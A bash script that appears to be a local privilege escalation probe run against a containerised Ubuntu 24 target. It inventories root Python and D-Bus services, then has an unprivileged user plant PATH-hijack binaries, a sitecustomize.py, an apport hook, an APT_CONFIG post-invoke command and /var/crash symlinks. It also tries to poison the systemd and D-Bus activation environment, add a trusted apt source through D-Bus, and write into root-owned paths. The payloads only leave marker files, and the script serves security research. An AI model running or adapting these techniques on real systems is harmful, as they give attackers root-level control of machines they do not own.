#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
ATTACKER="${ATTACKER:-attacker}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/root-python-dbus-current-deep-20260517.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

section() {
  printf '\n===== %s =====\n' "$1"
}

target_root() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q bash -s\n' "$TARGET"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" bash -s
}

target_attacker() {
  local label="$1"
  section "$label"
  printf '$ docker exec -i %q runuser -u %q -- bash -s\n' "$TARGET" "$ATTACKER"
  docker exec -i -e ATTACKER="$ATTACKER" "$TARGET" runuser -u "$ATTACKER" -- bash -s
}

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

echo "root Python/D-Bus current deep probe"
echo "target=$TARGET attacker=$ATTACKER"
date '+%Y-%m-%dT%H:%M:%S%z'

target_root "cleanup before probe" <<'TARGET'
set +e
probe=root_python_dbus_current_deep
rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /run/${probe}* /var/crash/${probe}* 2>/dev/null || true
rm -f /root/${probe}* /root/root_python_dbus_lpe* 2>/dev/null || true
pkill -f /usr/lib/software-properties/software-properties-dbus 2>/dev/null || true
systemctl reset-failed 2>/dev/null || true
envout="$(systemctl show-environment 2>/dev/null || true)"
case "$envout" in *"/home/${ATTACKER}/${probe}/bin"*) systemctl unset-environment PATH 2>/dev/null || true;; esac
for k in PYTHONPATH PYTHONHOME PYTHONSAFEPATH UA_DATA_DIR APPORT_DATA_DIR APT_CONFIG DBUS_TEST_NETPLAN_ROOT ROOT_PYTHON_DBUS_PROBE; do
  if printf '%s\n' "$envout" | grep -q "^${k}="; then
    systemctl unset-environment "$k" 2>/dev/null || true
  fi
done
true
TARGET

target_root "live target, packages, D-Bus, polkit, and root Python inventory" <<'TARGET'
set +e
echo "== identity =="
cat /etc/os-release
uname -a
ps -p 1 -o pid=,user=,comm=,args=
id "$ATTACKER"
getent passwd "$ATTACKER"
getent group sudo admin adm docker lxd 2>/dev/null || true
runuser -u "$ATTACKER" -- bash -lc 'id; sudo -n true; echo sudo_rc=$?' 2>&1

echo
echo "== package versions =="
for pkg in dbus dbus-daemon polkitd pkexec policykit-1 packagekit software-properties-common \
  python3-software-properties netplan.io libnetplan1 python3-netplan command-not-found \
  python3-commandnotfound ubuntu-pro-client ubuntu-release-upgrader-core update-manager-core \
  update-notifier-common unattended-upgrades apport apport-core-dump-handler networkd-dispatcher \
  landscape-common sosreport cloud-init apt python3 python3-apt python3-dbus systemd; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
done | sort

echo
echo "== D-Bus system service files =="
for f in /usr/share/dbus-1/system-services/*.service; do
  [ -e "$f" ] || continue
  echo "### $f"
  sed -n '1,24p' "$f"
  exec_path="$(sed -n 's/^Exec=//p' "$f" | awk '{print $1}')"
  if [ -n "$exec_path" ] && [ -e "$exec_path" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$exec_path"
    file -L "$exec_path" 2>/dev/null || true
    dpkg-query -S "$exec_path" 2>/dev/null || true
  fi
done

echo
echo "== active/activatable bus names of interest =="
busctl --system --list --no-pager 2>/dev/null | grep -Ei 'netplan|software|packagekit|apport|ubuntu|apt|systemd1|policykit' || true

echo
echo "== relevant D-Bus policies =="
for f in \
  /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf \
  /usr/share/dbus-1/system.d/io.netplan.Netplan.conf \
  /usr/share/dbus-1/system.d/org.freedesktop.PackageKit.conf; do
  [ -e "$f" ] || continue
  echo "### $f"
  sed -n '1,180p' "$f"
done

echo
echo "== relevant polkit actions =="
pkaction 2>/dev/null | grep -Ei 'ubuntu|software|apport|release|packagekit|netplan|apt|update' | sort | while read -r action; do
  echo "### $action"
  pkaction --verbose --action-id "$action" 2>/dev/null | grep -E 'action:|description:|message:|vendor:|implicit|allow|annotation' | sed -n '1,80p'
done

echo
echo "== root Python/system maintenance units =="
units='apt-news.service esm-cache.service ua-timer.service ubuntu-advantage.service ua-reboot-cmds.service update-notifier-download.service update-notifier-motd.service motd-news.service apt-daily.service apt-daily-upgrade.service unattended-upgrades.service apport.service apport-autoreport.service networkd-dispatcher.service packagekit.service'
for u in $units; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState -p Result \
    -p ConditionResult -p FragmentPath -p User -p Group -p WorkingDirectory \
    -p Environment -p PassEnvironment -p ExecStart "$u" 2>&1 || true
done

echo
echo "== executable Python scripts in audited packages =="
find /usr/bin /usr/sbin /usr/lib /usr/libexec /usr/share/apport /etc/update-motd.d \
  -xdev \( -type f -o -type l \) -perm /111 2>/dev/null |
while read -r f; do
  head -n 1 "$f" 2>/dev/null | grep -Eq 'python' || continue
  owner="$(dpkg-query -S "$f" 2>/dev/null | cut -d: -f1 | head -1)"
  case "$owner" in
    *software-properties*|*netplan*|*command-not-found*|*ubuntu-pro*|*ubuntu-release-upgrader*|*update-manager*|*update-notifier*|*apport*|*networkd-dispatcher*|*landscape*|*sosreport*|*cloud-init*|python3-minimal)
      printf '%s\t%s\n' "$f" "$owner"
      ;;
  esac
done | sort
TARGET

target_root "code and trust-boundary snippets" <<'TARGET'
set +e
show_brief() {
  f="$1"
  echo "### $f"
  if [ ! -e "$f" ] && [ ! -L "$f" ]; then
    echo "MISSING"
    return
  fi
  stat -Lc '%A %a %U:%G %F %n' "$f" 2>/dev/null || true
  dpkg-query -S "$f" 2>/dev/null || true
  kind="$(file -Lb "$f" 2>/dev/null || true)"
  echo "file: $kind"
  if printf '%s\n' "$kind" | grep -Eiq 'text|script|python|shell|perl'; then
    head -n 1 "$f" 2>/dev/null || true
    grep -nE 'polkit|Policy|check|auth|permission|import |from |sys\.path|PYTHON|PATH|HOME|DATA_DIR|APPORT|UA_|APT_CONFIG|mktemp|tempfile|/tmp|/var/crash|open\(|os\.open|rename|replace|symlink|follow|subprocess|Popen|call\(|systemctl|g_spawn|exec|shell|chmod|chown|write|save|sources|key|hook|plugin|script' "$f" 2>/dev/null | sed -n '1,140p'
  else
    strings "$f" 2>/dev/null | grep -E 'netplan|DBUS|PATH|ROOT|g_spawn|/run|/etc|/tmp|generate|apply|config|permission|Access' | sed -n '1,80p'
  fi
}

for f in \
  /usr/lib/software-properties/software-properties-dbus \
  /usr/lib/python3/dist-packages/softwareproperties/dbus/SoftwarePropertiesDBus.py \
  /usr/libexec/netplan/netplan-dbus \
  /usr/sbin/netplan \
  /usr/share/netplan/netplan.script \
  /usr/lib/python3/dist-packages/netplan/cli/core.py \
  /usr/lib/cnf-update-db \
  /usr/lib/python3/dist-packages/CommandNotFound/db/creator.py \
  /usr/lib/ubuntu-advantage/apt_news.py \
  /usr/lib/ubuntu-advantage/esm_cache.py \
  /usr/lib/ubuntu-advantage/timer.py \
  /usr/lib/python3/dist-packages/uaclient/config.py \
  /usr/lib/update-notifier/package-data-downloader \
  /usr/lib/update-notifier/apt-check \
  /usr/lib/ubuntu-release-upgrader/release-upgrade-motd \
  /usr/bin/do-release-upgrade \
  /usr/lib/ubuntu-release-upgrader/do-partial-upgrade \
  /usr/share/apport/apport \
  /usr/share/apport/whoopsie-upload-all \
  /usr/lib/python3/dist-packages/apport/report.py \
  /usr/lib/python3/dist-packages/apport/hookutils.py \
  /usr/bin/networkd-dispatcher; do
  show_brief "$f"
done

echo
echo "== audited directory permissions =="
paths='/usr/lib/software-properties /usr/lib/python3/dist-packages/softwareproperties /usr/lib/netplan /usr/lib/python3/dist-packages/netplan /usr/lib/python3/dist-packages/CommandNotFound /usr/lib/ubuntu-advantage /usr/lib/python3/dist-packages/uaclient /usr/lib/update-notifier /usr/lib/python3/dist-packages/UpdateManager /usr/lib/ubuntu-release-upgrader /usr/lib/python3/dist-packages/DistUpgrade /usr/share/apport /usr/share/apport/package-hooks /usr/share/apport/general-hooks /usr/lib/python3/dist-packages/apport /usr/share/package-data-downloads /etc/update-manager /etc/ubuntu-advantage /var/lib/ubuntu-advantage /var/lib/update-notifier /var/lib/command-not-found /etc/netplan /run/netplan /run/apport.socket /var/crash /etc/apt/apt.conf.d /etc/apt/sources.list.d /var/lib/apt/lists /var/cache/swcatalog /etc/networkd-dispatcher /usr/lib/networkd-dispatcher /etc/update-motd.d /var/cache/motd-news /var/lib/landscape'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>/dev/null || true
  else
    echo "MISSING $p"
  fi
done

echo
echo "== world/group writable entries under audited roots =="
find /usr/lib/software-properties /usr/lib/python3/dist-packages/softwareproperties \
  /usr/lib/netplan /usr/lib/python3/dist-packages/netplan \
  /usr/lib/python3/dist-packages/CommandNotFound /usr/lib/ubuntu-advantage \
  /usr/lib/python3/dist-packages/uaclient /usr/lib/update-notifier \
  /usr/lib/ubuntu-release-upgrader /usr/lib/python3/dist-packages/DistUpgrade \
  /usr/share/apport /usr/lib/python3/dist-packages/apport /usr/share/package-data-downloads \
  /etc/update-manager /etc/ubuntu-advantage /var/lib/ubuntu-advantage \
  /var/lib/update-notifier /var/lib/command-not-found /etc/netplan /run/netplan \
  /etc/apt/apt.conf.d /etc/apt/sources.list.d /var/lib/apt/lists /var/cache/swcatalog \
  /etc/networkd-dispatcher /usr/lib/networkd-dispatcher /etc/update-motd.d /var/crash \
  -xdev \( -perm -002 -o -perm -020 \) -not -type l -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

echo
echo "== uid1001 writability over audited roots =="
runuser -u "$ATTACKER" -- bash -s <<'ATTACKER'
set +e
paths='/usr/lib/software-properties /usr/lib/python3/dist-packages/softwareproperties /usr/lib/netplan /usr/lib/python3/dist-packages/netplan /usr/lib/python3/dist-packages/CommandNotFound /usr/lib/ubuntu-advantage /usr/lib/python3/dist-packages/uaclient /usr/lib/update-notifier /usr/lib/ubuntu-release-upgrader /usr/lib/python3/dist-packages/DistUpgrade /usr/share/apport /usr/share/apport/package-hooks /usr/share/apport/general-hooks /usr/share/package-data-downloads /etc/update-manager /etc/ubuntu-advantage /var/lib/ubuntu-advantage /var/lib/update-notifier /var/lib/command-not-found /etc/netplan /run/netplan /var/crash /etc/apt/apt.conf.d /etc/apt/sources.list.d /var/lib/apt/lists /var/cache/swcatalog /etc/networkd-dispatcher /usr/lib/networkd-dispatcher /etc/update-motd.d /var/cache/motd-news /var/lib/landscape'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    if [ -w "$p" ]; then echo "W $p"; else echo "NO_W $p"; fi
  else
    echo "MISSING $p"
  fi
done
ATTACKER
TARGET

target_attacker "plant uid1001 PATH, Python, APPORT_DATA_DIR, APT_CONFIG, and symlink payloads" <<'ATTACKER'
set -e
probe=root_python_dbus_current_deep
base="$HOME/$probe"
rm -rf "$base"
mkdir -p "$base/bin" "$base/py" "$base/apport-data/general-hooks" "$base/apport-data/package-hooks" "$base/apt" "$base/repo" "$base/ua-data" "$base/netplan-root/etc/netplan"

cat > "$base/bin/payload" <<'EOF'
#!/bin/sh
name="${0##*/}"
euid="$(/usr/bin/id -u 2>/dev/null || echo unknown)"
ruid="$(/usr/bin/id -ru 2>/dev/null || echo unknown)"
{
  printf 'PATH_HIT name=%s euid=%s ruid=%s argv=' "$name" "$euid" "$ruid"
  printf '%s ' "$@"
  printf '\n'
  /usr/bin/id
} >> /tmp/root_python_dbus_current_deep_path_hits 2>&1
if [ "$euid" = "0" ]; then
  {
    echo "ROOT PATH HIT name=$name"
    /usr/bin/id
  } > /root/root_python_dbus_current_deep_path_marker 2>&1
fi
exit 127
EOF
chmod 755 "$base/bin/payload"
for name in appstreamcli apt apt-config apt-get awk basename cat chmod chown cloud-id cp cut date dirname dpkg gpg grep head id install logger ls lsb_release mkdir mktemp mv netplan python3 rm sed sh sleep sort stat systemctl tail test touch tr uname wget xargs; do
  ln -sf payload "$base/bin/$name"
done

cat > "$base/py/sitecustomize.py" <<'PYEOF'
import os, sys
line = "PY_HIT euid=%s uid=%s cwd=%s path0=%r argv=%r\n" % (
    os.geteuid(), os.getuid(), os.getcwd(), sys.path[0] if sys.path else None, sys.argv
)
with open("/tmp/root_python_dbus_current_deep_py_hits", "a", encoding="utf-8") as fh:
    fh.write(line)
if os.geteuid() == 0:
    with open("/root/root_python_dbus_current_deep_py_marker", "w", encoding="utf-8") as fh:
        fh.write("ROOT PYTHON HIT " + line)
PYEOF

cat > "$base/apport-data/general-hooks/root_python_dbus_current_deep.py" <<'PYEOF'
import os
with open("/tmp/root_python_dbus_current_deep_apport_hook_hits", "a", encoding="utf-8") as fh:
    fh.write(f"APPORT_HOOK euid={os.geteuid()} uid={os.getuid()}\n")
if os.geteuid() == 0:
    with open("/root/root_python_dbus_current_deep_apport_marker", "w", encoding="utf-8") as fh:
        fh.write("ROOT APPORT HOOK\n")
PYEOF

cat > "$base/apt/apt.conf" <<EOF
Dir::State "$base/apt/state";
Dir::Cache "$base/apt/cache";
APT::Update::Post-Invoke-Success { "id > /root/root_python_dbus_current_deep_apt_config_marker"; };
EOF
mkdir -p "$base/apt/state/lists/partial" "$base/apt/cache/archives/partial"
touch "$base/repo/key.asc"
ln -s /root/root_python_dbus_current_deep_var_crash_symlink_target "/var/crash/${probe}.upload" 2>/dev/null || true
chmod -R u+rwX,go+rX "$base"
find "$base" -maxdepth 4 -type f -o -type l | sort
ls -l "/var/crash/${probe}.upload" 2>/dev/null || true
ATTACKER

target_attacker "uid1001 dynamic reachability attempts" <<'ATTACKER'
set +e
probe=root_python_dbus_current_deep
base="$HOME/$probe"
HOSTILE_PATH="$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
HOSTILE_ENV=(PATH="$HOSTILE_PATH" PYTHONPATH="$base/py" APPORT_DATA_DIR="$base/apport-data" UA_DATA_DIR="$base/ua-data" DBUS_TEST_NETPLAN_ROOT="$base/netplan-root" APT_CONFIG="$base/apt/apt.conf")

echo "== direct user-context helper probes =="
/usr/bin/id
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/lib/cnf-update-db --verbose >/tmp/${probe}_cnf_user.out 2>/tmp/${probe}_cnf_user.err; echo "cnf_rc=$?"
/usr/bin/sed -n '1,80p' /tmp/${probe}_cnf_user.out /tmp/${probe}_cnf_user.err 2>/dev/null
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/lib/command-not-found -- ifconfig >/tmp/${probe}_command_not_found_user.out 2>/tmp/${probe}_command_not_found_user.err; echo "command_not_found_rc=$?"
/usr/bin/sed -n '1,80p' /tmp/${probe}_command_not_found_user.out /tmp/${probe}_command_not_found_user.err 2>/dev/null
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/pro status >/tmp/${probe}_pro_user.out 2>/tmp/${probe}_pro_user.err; echo "pro_status_rc=$?"
/usr/bin/sed -n '1,80p' /tmp/${probe}_pro_user.out /tmp/${probe}_pro_user.err 2>/dev/null
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /etc/update-motd.d/50-motd-news --force >/tmp/${probe}_motd_user.out 2>/tmp/${probe}_motd_user.err; echo "motd_rc=$?"
/usr/bin/sed -n '1,80p' /tmp/${probe}_motd_user.out /tmp/${probe}_motd_user.err 2>/dev/null

echo
echo "== attempts to poison systemd/dbus activation environment =="
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/systemctl set-environment "PATH=$HOSTILE_PATH" "PYTHONPATH=$base/py" "APPORT_DATA_DIR=$base/apport-data" "UA_DATA_DIR=$base/ua-data" "APT_CONFIG=$base/apt/apt.conf" "DBUS_TEST_NETPLAN_ROOT=$base/netplan-root" 2>&1
echo "systemctl_setenv_rc=$?"
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/busctl call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus UpdateActivationEnvironment a{ss} 6 PATH "$HOSTILE_PATH" PYTHONPATH "$base/py" APPORT_DATA_DIR "$base/apport-data" UA_DATA_DIR "$base/ua-data" APT_CONFIG "$base/apt/apt.conf" DBUS_TEST_NETPLAN_ROOT "$base/netplan-root" 2>&1
echo "dbus_update_activation_environment_rc=$?"

echo
echo "== attempts to start root maintenance units =="
for u in apt-news.service esm-cache.service ua-timer.service update-notifier-download.service update-notifier-motd.service motd-news.service apt-daily.service apt-daily-upgrade.service apport-autoreport.service networkd-dispatcher.service; do
  echo "### systemctl start $u"
  /usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 15 /usr/bin/systemctl start "$u" 2>&1
  echo "rc=$?"
done

echo
echo "== software-properties D-Bus calls from hostile uid1001 env =="
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method org.freedesktop.DBus.Introspectable.Introspect >/tmp/${probe}_sp_intro.xml 2>/tmp/${probe}_sp_intro.err
echo "sp_introspect_rc=$?"
/usr/bin/grep -E 'method name=' /tmp/${probe}_sp_intro.xml | /usr/bin/sed -n '1,120p' || /usr/bin/sed -n '1,80p' /tmp/${probe}_sp_intro.err
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.Reload 2>&1
echo "sp_reload_rc=$?"
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddSourceFromLine "deb [trusted=yes] file:$base/repo noble main" 2>&1
echo "sp_add_source_rc=$?"
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddKey "$base/repo/key.asc" 2>&1
echo "sp_add_key_rc=$?"
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.UpdateKeys 2>&1
echo "sp_update_keys_rc=$?"
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.SetUpdateInterval 1 2>&1
echo "sp_set_update_interval_rc=$?"

echo
echo "== netplan D-Bus calls from hostile uid1001 env =="
/usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest io.netplan.Netplan --object-path /io/netplan/Netplan --method org.freedesktop.DBus.Introspectable.Introspect >/tmp/${probe}_netplan_intro.xml 2>/tmp/${probe}_netplan_intro.err
echo "netplan_introspect_rc=$?"
/usr/bin/grep -E 'method name=' /tmp/${probe}_netplan_intro.xml | /usr/bin/sed -n '1,120p' || /usr/bin/sed -n '1,80p' /tmp/${probe}_netplan_intro.err
for m in Info Config Generate Apply; do
  echo "### io.netplan.Netplan.$m"
  /usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 12 /usr/bin/gdbus call --system --dest io.netplan.Netplan --object-path /io/netplan/Netplan --method "io.netplan.Netplan.$m" 2>&1
  echo "rc=$?"
done

echo
echo "== PackageKit cache/update trigger attempt =="
if [ -x /usr/bin/pkcon ]; then
  /usr/bin/env "${HOSTILE_ENV[@]}" /usr/bin/timeout 35 /usr/bin/pkcon refresh force 2>&1
  echo "pkcon_refresh_rc=$?"
else
  echo "pkcon missing"
fi

echo
echo "== write/symlink attempts into root trust/config/state paths =="
try_write() {
  p="$1"
  echo "### $p"
  /usr/bin/rm -f "$p" 2>/dev/null || true
  printf probe > "$p" 2>&1
  echo "write_rc=$?"
  /usr/bin/rm -f "$p" 2>/dev/null || true
  /usr/bin/ln -s /root/root_python_dbus_current_deep_symlink_target "$p" 2>&1
  echo "symlink_rc=$?"
  /usr/bin/ls -ld "$p" 2>/dev/null || true
}
try_write /etc/netplan/99-root-python-dbus.yaml
try_write /etc/apt/sources.list.d/root-python-dbus.sources
try_write /var/lib/command-not-found/commands.db.tmp
try_write /var/lib/update-notifier/updates-available
try_write /var/cache/motd-news
try_write /usr/share/package-data-downloads/root-python-dbus
try_write /usr/share/apport/package-hooks/source_root_python_dbus.py
/usr/bin/mkdir -p /var/lib/ubuntu-advantage/messages 2>/dev/null || true
try_write /var/lib/ubuntu-advantage/messages/root-python-dbus
/usr/bin/mkdir -p /var/lib/apport/autoreport 2>&1
echo "mkdir_autoreport_rc=$?"

echo
echo "== user-visible payload markers after uid1001 attempts =="
for f in /tmp/${probe}_path_hits /tmp/${probe}_py_hits /tmp/${probe}_apport_hook_hits; do
  echo "### $f"
  if [ -e "$f" ]; then /usr/bin/ls -l "$f"; /usr/bin/sed -n '1,80p' "$f"; else echo ABSENT; fi
done
ATTACKER

target_root "root-side observation after uid1001 attempts" <<'TARGET'
set +e
probe=root_python_dbus_current_deep
echo "== activated service process state =="
busctl --system --list --no-pager 2>/dev/null | grep -Ei 'SoftwareProperties|netplan|PackageKit|ubuntu|apport' || true
pgrep -fa 'software-properties-dbus|netplan-dbus|packagekitd|apport|ubuntu-advantage' || true
for p in $(pgrep -f 'software-properties-dbus|netplan-dbus' 2>/dev/null); do
  echo "### pid $p"
  tr '\0' '\n' < "/proc/$p/cmdline" 2>/dev/null | sed 's/^/cmdline: /'
  readlink "/proc/$p/cwd" 2>/dev/null | sed 's/^/cwd: /'
  tr '\0' '\n' < "/proc/$p/environ" 2>/dev/null | grep -E '^(PATH|PYTHON|HOME|PWD|UA_|APPORT|APT_CONFIG|DBUS_TEST|ROOT_PYTHON)' || true
done

echo
echo "== root-triggered upper-bound maintenance execution with attacker payloads present =="
systemctl show-environment 2>/dev/null | grep -E '^(PATH|PYTHONPATH|UA_DATA_DIR|APPORT_DATA_DIR|APT_CONFIG|DBUS_TEST_NETPLAN_ROOT)=' || true
for u in apt-news.service esm-cache.service ua-timer.service update-notifier-download.service update-notifier-motd.service motd-news.service apt-daily.service apt-daily-upgrade.service apport-autoreport.service networkd-dispatcher.service; do
  echo "### root start $u"
  timeout 45 systemctl start "$u" 2>&1
  echo "rc=$?"
done
/etc/cron.daily/apport 2>&1 || true

echo
echo "== root proof and marker sweep =="
for f in /root/${probe}* /root/root_python_dbus_lpe* /tmp/${probe}_path_hits /tmp/${probe}_py_hits /tmp/${probe}_apport_hook_hits /var/crash/${probe}.upload; do
  echo "### $f"
  if [ -e "$f" ] || [ -L "$f" ]; then
    ls -l "$f"
    if [ -f "$f" ]; then sed -n '1,80p' "$f" 2>/dev/null || true; fi
  else
    echo ABSENT
  fi
done

if compgen -G "/root/${probe}*" >/dev/null || compgen -G "/root/root_python_dbus_lpe*" >/dev/null; then
  echo "ROOT_PROOF=YES"
else
  echo "ROOT_PROOF=NO"
fi

echo
echo "== cleanup after negative run =="
if ! compgen -G "/root/${probe}*" >/dev/null && ! compgen -G "/root/root_python_dbus_lpe*" >/dev/null; then
  rm -rf "/home/${ATTACKER}/${probe}" /tmp/${probe}* /run/${probe}* /var/crash/${probe}* 2>/dev/null || true
fi
pkill -f /usr/lib/software-properties/software-properties-dbus 2>/dev/null || true
systemctl reset-failed 2>/dev/null || true
systemctl is-system-running 2>&1 || true
systemctl --failed --no-legend 2>&1 || true
TARGET

echo
echo "probe complete: $LOG"
